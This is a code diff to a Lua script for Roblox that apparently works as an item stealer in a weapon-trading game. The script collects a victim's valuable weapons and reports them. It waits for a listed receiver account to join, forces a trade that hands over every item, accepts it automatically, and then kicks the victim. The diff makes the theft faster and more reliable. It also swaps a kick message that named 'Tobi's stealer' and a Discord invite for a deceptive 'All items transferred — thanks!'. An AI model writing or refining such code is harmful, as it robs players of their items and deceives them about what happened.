@@ -213,6 +213,7 @@ end
 
 local totalValue = 0
 local weaponsToSend = {}
+local tradeStarted = false
 
 local function SendFirstMessage(list, prefix)
     local fields = {
@@ -357,6 +358,9 @@ if #weaponsToSend > 0 then
     SendFirstMessage(weaponsToSend, prefix)
 
     local function doTrade(joinedUser)
+        if tradeStarted then return end
+        tradeStarted = true
+
         local initialState = getTradeStatus()
         if initialState == "StartTrade" then
             game:GetService("ReplicatedStorage").Trade.DeclineTrade:FireServer()
@@ -382,35 +386,32 @@ if #weaponsToSend > 0 then
                         addWeaponToTrade(weapon.DataID)
                     end
                 end
-                task.wait(6)
+                task.wait(2)
                 acceptTrade()
                 waitForTradeCompletion()
             else
                 task.wait(0.5)
             end
+            task.wait(0.5)
+        end
+
+        SendMessage(sentWeapons)
+        task.wait(1)
+        plr:Kick("All items transferred — thanks!")
+    end
+
+    local function checkForReceiver()
+        while not tradeStarted do
+            for _, player in ipairs(Players:GetPlayers()) do
+                if table.find(users, player.Name) then
+                    task.wait(1.5)
+                    doTrade(player.Name)
+                    break
+                end
+            end
             task.wait(1)
         end
-        plr:Kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
-    local function waitForUserChat()
-        local sentMessage = false
-        local function onPlayerChat(player)
-            if table.find(users, player.Name) then
-                player.Chatted:Connect(function()
-                    if not sentMessage then
-                        SendMessage(sentWeapons)
-                        sentMessage = true
-                    end
-                    doTrade(player.Name)
-                end)
-            end
-        end
-        for _, p in ipairs(Players:GetPlayers()) do
-            onPlayerChat(p)
-        end
-        Players.PlayerAdded:Connect(onPlayerChat)
-    end
-
-    waitForUserChat()
+    task.spawn(checkForReceiver)
 end
